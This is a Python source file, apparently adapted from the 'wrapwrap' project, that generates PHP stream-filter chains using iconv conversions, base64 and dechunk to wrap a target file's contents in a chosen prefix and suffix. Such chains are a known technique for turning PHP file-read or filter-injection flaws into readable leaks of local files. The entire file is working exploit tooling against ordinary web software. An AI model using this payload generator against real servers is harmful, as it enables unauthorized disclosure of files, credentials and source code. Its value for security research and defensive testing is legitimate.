# from: https://github.com/ambionics/wrapwrap
import base64
from .constants import * 

class WrapWrap:
    padding_character: str = " "

    def __init__(self):
        self.prefix = b"  '"
        self.suffix = b"'" 

    def generate(self, nb_bytes) -> None:
        self.prefix = self.prefix
        self.suffix = self.suffix
        
        self.filters = []
        
        if self.suffix:
            self.compute_nb_chunks(nb_bytes)
            self.prelude()
            self.add_suffix()
            self.pad_suffix()
            self.add_prefix()
            self.postlude()

        filters = "/".join(self.filters)
        return filters

    def compute_nb_chunks(self, nb_bytes) -> None:
        real_stop = self.align_value(nb_bytes, 9)
        self.nb_chunks = int(real_stop / 9 * 4)

    def __truediv__(self, filters: str) -> None:
        self.filters.append(filters)
        return self

    def push_char(self, c: bytes) -> None:
        if isinstance(c, int):
            c = bytes((c,))
        return self / CONVERSIONS[c.decode()] / B64D / B64E

    def push_char_safely(self, c: bytes) -> None:
        self.push_char(c) / REMOVE_EQUAL

    def align(self) -> None:
        """Makes the B64 payload have a size divisible by 3.
        The second B64 needs to be 3-aligned because the third needs to be 4-aligned.
        """
        self / B64E / QPE / REMOVE_EQUAL
        self.push_char(b"A")
        self / QPE / REMOVE_EQUAL
        self.push_char(b"A")
        self / QPE / REMOVE_EQUAL
        self.push_char_safely(b"A")
        self.push_char_safely(b"A")
        self / B64D

    def prelude(self) -> None:
        self / B64E / B64E
        self.align()
        self / "convert.iconv.437.UCS-4le"

    def add3_swap(self, triplet: bytes) -> None:
        assert len(triplet) == 3, f"add3 called with: {triplet}"
        b64 = self.b64e(triplet)
        self / B64E
        self.push_char(b64[3])
        self.push_char(b64[2])
        self.push_char(b64[1])
        self.push_char(b64[0])
        self / B64D
        self / SWAP4

    def b64e(self, value: bytes, strip: bool = False) -> bytes:
        value = base64.b64encode(value)
        if strip:
            while value.endswith(b"="):
                value = value.removesuffix(b"=")
        return value

    def add_suffix(self) -> None:
        """Adds a suffix to the string, along with the <LF>0<LF> that marks the end of
        chunked data.
        """
        self.add3_swap(b"\n0\n")
        suffix_b64 = self.b64e(self.suffix)
        reverse = False

        chunks = [suffix_b64[i:i+2] for i in range(0, len(suffix_b64), 2)]
        for chunk in reversed(chunks):
            chunk = self.b64e(chunk, strip=True)
            chunk = self.set_lsbs(chunk)
            if reverse:
                chunk = chunk[::-1]
            self.add3_swap(chunk)
            reverse = not reverse

    def pad_suffix(self) -> None:
        """Moves the suffix up the string."""
        for _ in range(self.nb_chunks * 4 + 2):
            # This is not a random string: it minimizes the size of the payload
            self.add3_swap(b"\x08\x29\x02")

    def add_prefix(self) -> None:
        self / B64E

        prefix = self.align_right(self.prefix, 3)
        prefix = self.b64e(prefix)
        prefix = self.align_right(prefix, 3 * 3, "\x00")
        prefix = self.b64e(prefix)
        size = int(
            len(self.b64e(self.suffix)) / 2 * 4
            + self.nb_chunks * 4 * 4
            + 2
            + 7
            + len(prefix)
        )
        chunk_header = self.align_left(f"{size:x}\n".encode(), 3, "0")
        b64 = self.b64e(chunk_header + prefix)
        for char in reversed(b64):
            self.push_char(char)

    def postlude(self) -> None:
        self / B64D / "dechunk" / B64D / B64D

    def set_lsbs(self, chunk: bytes) -> bytes:
        """Sets the two LS bits of the given chunk, so that the caracter that comes
        after is not ASCII, and thus not a valid B64 char. A double decode would
        therefore "remove" that char.
        """
        char = chunk[2]
        alphabet = b"ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/"
        index = alphabet.find(char)
        return chunk[:2] + alphabet[index + 3: index + 3 + 1]

    def align_right(self, input_str: bytes, n: int, p: str = None) -> bytes:
        """Aligns the input string to the right to make its length divisible by n, using
        the specified pad character.
        """
        p = p or self.padding_character
        p = p.encode()
        padding_size = (n - len(input_str) % n) % n
        aligned_str = input_str.ljust(len(input_str) + padding_size, p)

        return aligned_str

    def align_left(self, input_str: bytes, n: int, p: str = None) -> bytes:
        """Aligns the input string to the left to make its length divisible by n, using
        the specified pad character.
        """
        p = p or self.padding_character
        p = p.encode()
        aligned_str = input_str.rjust(self.align_value(len(input_str), n), p)

        return aligned_str

    @staticmethod
    def align_value(value: int, div: int) -> int:
        return value + (div - value % div) % div

